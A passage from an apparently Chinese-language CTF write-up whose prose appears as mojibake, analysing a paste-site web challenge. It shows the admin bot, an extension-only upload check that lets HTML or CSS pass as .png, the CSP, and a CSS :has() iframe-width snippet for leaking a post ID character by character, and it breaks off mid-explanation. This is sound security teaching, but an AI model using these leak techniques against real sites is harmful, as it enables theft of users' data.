punctuation">(</span>r<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">visit</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> user <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> pass <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> browser<span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">headless</span><span class="token operator">:</span> <span class="token string">"new"</span><span class="token punctuation">,</span>            <span class="token literal-property property">pipe</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>            <span class="token literal-property property">args</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token string">"--no-sandbox"</span><span class="token punctuation">,</span>                <span class="token string">"--disable-setuid-sandbox"</span><span class="token punctuation">,</span>                <span class="token string">"--js-flags=--noexpose_wasm,--jitless"</span><span class="token punctuation">,</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token literal-property property">dumpio</span><span class="token operator">:</span> <span class="token boolean">true</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> context <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">createIncognitoBrowserContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> page <span class="token operator">=</span> <span class="token keyword">await</span> context<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span><span class="token string">"http://localhost:3000/register"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">5000</span><span class="token punctuation">,</span> <span class="token literal-property property">waitUntil</span><span class="token operator">:</span> <span class="token string">'domcontentloaded'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// create new account</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">waitForSelector</span><span class="token punctuation">(</span><span class="token string">"button[type=submit]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"input[placeholder='Username']"</span><span class="token punctuation">,</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"input[placeholder='Password']"</span><span class="token punctuation">,</span> pass<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token string">"button[type=submit]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// create paste with flag</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"input[placeholder='Title']"</span><span class="token punctuation">,</span> <span class="token string">"Flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"textarea[placeholder='Paste contents']"</span><span class="token punctuation">,</span> <span class="token string">"Flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> imgUpload <span class="token operator">=</span> <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"input[type=file]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> imgUpload<span class="token punctuation">.</span><span class="token function">uploadFile</span><span class="token punctuation">(</span><span class="token string">"./flag.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token string">"button[type=submit]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// go to exploit page</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">5000</span><span class="token punctuation">,</span> <span class="token literal-property property">waitUntil</span><span class="token operator">:</span> <span class="token string">'domcontentloaded'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">30_000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        browser <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>browser<span class="token punctuation">)</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> user<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span> visit <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœƒå…ˆéš¨æ©Ÿç”¢ç”Ÿä¸€çµ„å¸³è™Ÿå¯†ç¢¼ï¼Œè¨»å†Šå¾Œä¸Šå‚³ flag ä½œç‚ºåœ–ç‰‡ï¼Œæ¥è‘—è¨ªå•æˆ‘å€‘çš„ç¶²é ã€‚å› æ­¤ç›®æ¨™å°±æ˜¯è¦å·èµ°é€™å¼µåœ–ç‰‡ï¼Œå°±å¯ä»¥æ‹¿åˆ° flagã€‚</p><p>é€™é¡Œå‰ç«¯åœ¨é¡¯ç¤º note æ™‚ï¼Œç”¨çš„éƒ½æ˜¯å®‰å…¨çš„é¡¯ç¤ºæ–¹å¼ï¼Œæ‰€ä»¥æ²’è¾¦æ³•æ³¨å…¥ HTML ç­‰ç­‰ï¼Œå› æ­¤ä¸€å®šæ˜¯è¦æ‰¾åˆ¥çš„æ–¹å¼ï¼Œå…¶ä¸­å°±å±¬ä¸Šå‚³æª”æ¡ˆæœ€ç‚ºå¯ç–‘äº†ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">fastify<span class="token punctuation">.</span><span class="token function">route</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>    <span class="token literal-property property">path</span><span class="token operator">:</span> <span class="token string">'/api/create'</span><span class="token punctuation">,</span>    <span class="token literal-property property">onRequest</span><span class="token operator">:</span> requiresLogin<span class="token punctuation">,</span>    <span class="token function-variable function">handler</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> body <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">fromEntries</span><span class="token punctuation">(</span>            Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">key</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">[</span>key<span class="token punctuation">,</span> req<span class="token punctuation">.</span>body<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> title<span class="token punctuation">,</span> text <span class="token punctuation">&#125;</span> <span class="token operator">=</span> body<span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> title <span class="token operator">!==</span> <span class="token string">"string"</span> <span class="token operator">||</span> <span class="token keyword">typeof</span> text <span class="token operator">!==</span> <span class="token string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Title or text must be string"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>title<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">32</span> <span class="token operator">||</span> text<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">512</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Title or text too long"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">const</span> id <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> paste <span class="token operator">=</span> <span class="token punctuation">&#123;</span> id<span class="token punctuation">,</span> title<span class="token punctuation">,</span> text <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>file<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">const</span> filename <span class="token operator">=</span> <span class="token function">sanitizeFilename</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>file<span class="token punctuation">.</span>filename<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">const</span> ext <span class="token operator">=</span> filename<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>filename<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token string">".png"</span><span class="token punctuation">,</span> <span class="token string">".jpeg"</span><span class="token punctuation">,</span> <span class="token string">".jpg"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>ext<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Invalid file format for image"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">const</span> buffer <span class="token operator">=</span> <span class="token keyword">await</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>file<span class="token punctuation">.</span><span class="token function">toBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">await</span> fsp<span class="token punctuation">.</span><span class="token function">mkdir</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public'</span><span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>user<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">await</span> fsp<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public'</span><span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>user<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            paste<span class="token punctuation">.</span>image <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>user<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>filename<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>pastes<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>paste<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">success</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ä¸Šå‚³æª”æ¡ˆæ™‚æœƒæª¢æŸ¥æ˜¯å¦ç‚º <code>.png</code>ã€<code>.jpeg</code> æˆ– <code>.jpg</code> çµå°¾ï¼Œä¸æ˜¯çš„è©±å°±æ‹‹å‡ºéŒ¯èª¤ã€‚é›–ç„¶ä¹çœ‹ä¹‹ä¸‹åªèƒ½ä¸Šå‚³åœ–ç‰‡ï¼Œä½†å¦‚æœä¸Šå‚³æª”åæ˜¯ <code>.png</code> çš„æª”æ¡ˆï¼Œåœ¨èˆŠç‰ˆçš„ fastify static ä¸­å°±ä¸æœƒæœ‰ mimetypeï¼Œé€™é¡Œä¹Ÿæ²’æœ‰ç¦æ­¢ mime sniffingï¼Œå°±èƒ½ä¸Šå‚³ HTML æˆ–æ˜¯ CSS æª”æ¡ˆã€‚</p><p>é †å¸¶ä¸€æï¼Œé€™ä¸€é¡Œçš„ CSP å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">fastify<span class="token punctuation">.</span><span class="token function">addHook</span><span class="token punctuation">(</span><span class="token string">'onRequest'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> done</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> users<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        req<span class="token punctuation">.</span>user <span class="token operator">=</span> users<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    res<span class="token punctuation">.</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Security-Policy"</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">        script-src 'sha256-BCut0I6hAnpHxUpwpaDB1crwgr249r2udW3tkBGQLv4=' 'unsafe-inline';        img-src 'self';        style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/css2;        font-src https://fonts.gstatic.com/s/inter/;        frame-ancestors 'none';        object-src 'none';        base-uri 'none';    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\s+</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Cache-Control"</span><span class="token punctuation">,</span> <span class="token string">"no-cache, no-store"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"X-Frame-Options"</span><span class="token punctuation">,</span> <span class="token string">"DENY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é›–ç„¶èªªä¹çœ‹ä¹‹ä¸‹ script-src æœ‰ unsafe-inlineï¼Œä½†å…¶å¯¦æ˜¯æ²’ä½œç”¨çš„ï¼Œå˜—è©¦äº†ä¹‹å¾Œæœƒç™¼ç¾åº•ä¸‹éŒ¯èª¤ï¼š</p><pre class="line-numbers language-none"><code class="language-none">refused to execute inline script because it violates the following Content Security Policy directive:&quot;script-src &#39;sha256-BCut0I6hAnpHxUpwpaDB1crwgr249r2udW3tkBGQLv4&#x3D;&#39; &#39;unsafe-inline&#39;&quot;. Note that &#39;unsafe-inline&#39; is ignored if either a hash or nonce value is present in the source list.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› æ­¤é€™é¡Œå¯ä»¥ç”¨çš„ JavaScript åªæœ‰é¡Œç›®åŸå…ˆçµ¦çš„è€Œå·²ï¼Œå…¶ä»–éƒ½è¦é  CSS æå®šã€‚</p><p>åˆ©ç”¨ä»¥å‰ä½œè€…å‡ºéçš„å¦å¤–ä¸€é¡Œçš„æŠ€å·§ï¼Œå¯ä»¥è—‰ç”± dom clobbering defaultView ä¾†æ±ºå®š client router è¦ render å“ªä¸€é ï¼Œå°±ç­‰æ–¼æ˜¯å¯ä»¥åœ¨ä»»æ„é é¢æ³¨å…¥ HTML è·Ÿ CSSï¼Œç´°ç¯€å¯ä»¥åƒè€ƒæˆ‘å¯«éçš„ï¼š<a href="https://blog.huli.tw/2022/08/21/en/corctf-2022-modern-blog-writeup/">corCTF 2022 writeup - modernblog</a>ã€‚</p><p>æˆ‘å€‘éœ€è¦å…ˆå¾—åˆ° <code>/home</code> è£¡é¢æœƒå‡ºç¾çš„ post idï¼Œå†å¾—åˆ° <code>/view/:id</code> è£¡é¢æœƒå‡ºç¾çš„åœ–ç‰‡è·¯å¾‘ï¼Œå°±èƒ½å–å¾— flagã€‚é€™å€‹ post id çš„é•·åº¦æœ‰ 16 ä½ï¼Œæ¯ä¸€ä½éƒ½æ˜¯ 0-fï¼Œæ›´éº»ç…©çš„æ˜¯é€™å€‹ post id æ¯ä¸€æ¬¡è«‹æ±‚éƒ½æœƒæ›´æ–°ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">fastify<span class="token punctuation">.</span><span class="token function">route</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'GET'</span><span class="token punctuation">,</span>    <span class="token literal-property property">path</span><span class="token operator">:</span> <span class="token string">'/api/pastes'</span><span class="token punctuation">,</span>    <span class="token literal-property property">onRequest</span><span class="token operator">:</span> requiresLogin<span class="token punctuation">,</span>    <span class="token function-variable function">handler</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>pastes<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">p</span> <span class="token operator">=></span> p<span class="token punctuation">.</span>id <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>pastes<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">&#123;</span> id<span class="token punctuation">,</span> title <span class="token punctuation">&#125;</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">(</span><span class="token punctuation">&#123;</span> id<span class="token punctuation">,</span> title <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½œè€…çµ¦çš„è§£æ³•æ˜¯é‹ç”¨ CSS + iframe ä¾† leak å‡ºé é¢ä¸Šçš„è³‡è¨Šï¼Œå¦‚æœåªæ˜¯æ´©éœ²å‡ºä¸€ä½å¾ˆç°¡å–®ï¼Œå¯ä»¥åˆ©ç”¨é•·å¯¬ä¾†åšï¼Œåƒæ˜¯ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">  <span class="token selector">body:has(a[href^="/view/1"]) iframe</span> <span class="token punctuation">&#123;</span>    <span class="token property">width</span><span class="token punctuation">:</span> 1px<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token selector">body:has(a[href^="/view/2"]) iframe</span> <span class="token punctuation">&#123;</span>    <span class="token property">width</span><span class="token punctuation">:</span> 2px<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› ç‚ºé€™é‚Š CSP ä¸¦æ²’æœ‰ frame-srcï¼Œæ‰€ä»¥é€™å€‹ iframe æœƒæ˜¯æˆ‘å€‘çš„ originï¼Œå¯ä»¥ç”¨ <code>window.innerWidth</code> ä¾†å¾—åˆ°å¯¬åº¦ï¼Œè—‰æ­¤çŸ¥é“ç¬¬ä¸€å€‹å­—å…ƒæ˜¯ä»€éº¼ã€‚</p><p>ä½†å•é¡Œæ˜¯æ¯æ¬¡è«‹æ±‚éƒ½æœƒä¸ä¸€æ¨£ï¼Œæ‰€ä»¥æˆ‘å€‘å¿…é ˆåœ¨ä¸€æ¬¡ä¹‹å…§å¾—åˆ°æ‰€æœ‰å­—å…ƒï¼Œå¦å‰‡ id å°±ä¸åŒäº†ã€‚</p><p>å¦‚æœè¦ä¸€æ¬¡ leak å‡ºé€™éº¼å¤šå­—å…ƒï¼Œä¸€ç¨®æ–¹å¼æ˜¯ä½¿ç”¨ä¹‹å‰åœ¨ <a href="https://blog.huli.tw/2023/12/11/0ctf-2023-writeup/">0CTF 2023</a> ä¸­æ‰æéçš„æ–¹å¼ï¼Œå¦ä¸€ç¨®æ˜¯ recursive importï¼Œä½†é€™ç¨®é€šå¸¸éƒ½éœ€è¦æœ‰è‡ªå·±çš„ server é…åˆã€‚</p><p>è€Œä½œè€…å‰‡æ˜¯åˆ©ç”¨äº† connection pool çš„ä¸Šé™è§£æ‰äº†å¾Œè€…çš„å•é¡Œï¼Œconnection pool åœ¨ CTF ä¸­å‡ºç¾çš„é »ç‡ä¸ä½ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯æŠŠ Chromium çš„ 255 å€‹ connection éƒ½å¡«æ»¿ï¼Œå°±èƒ½æ§åˆ¶ä¸‹ä¸€å€‹è³‡æºä»€éº¼æ™‚å€™è¼‰å…¥ã€‚</p><p>å› æ­¤åšæ³•æ˜¯ï¼š</p><ol><li>å…ˆå¼•å…¥ç¬¬ä¸€å€‹ styleï¼ˆå‡è¨­å«åš <code>.jpg</code>ï¼‰ï¼Œè£¡é¢æœƒ leak å‡ºç¬¬ä¸€å€‹å­—å…ƒä¸¦ä¸” import <code>.png</code></li><li>æ­¤æ™‚åœ¨æˆ‘å€‘çš„ç¶²é æŠŠ connection å¡«æ»¿ï¼Œç›´åˆ° leak å‡ºç¬¬ä¸€å€‹å­—ä¸¦ä¸”ä¸Šå‚³æ–°çš„ style æª”æ¡ˆå¾Œæ‰é‡‹æ”¾</li><li>ä¸æ–·é‡è¤‡ä»¥ä¸Šåšæ³•</li></ol><p>æ¦‚å¿µæ˜¯æ‡‰è©²æ˜¯é€™æ¨£ï¼Œä½†å¯¦ä½œä¸Šä¼¼ä¹æœ‰è¨±å¤šç‹€æ³éœ€è¦è€ƒæ…®ï¼Œæœƒè¤‡é›œè¨±å¤šï¼Œå¯ä»¥åƒè€ƒæœ€å¾Œæœƒé™„ä¸Šçš„ä½œè€…è§£æ³•ï¼Œè£¡é¢æœ‰æ›´å¤šç´°ç¯€ã€‚</p><p>leak å‡º id ä»¥å¾Œï¼Œæ¥è‘—å°±å¯ä»¥å¦‚æ³•ç‚®è£½ï¼ŒæŠŠåœ–ç‰‡è·¯å¾‘ä¹Ÿ leak 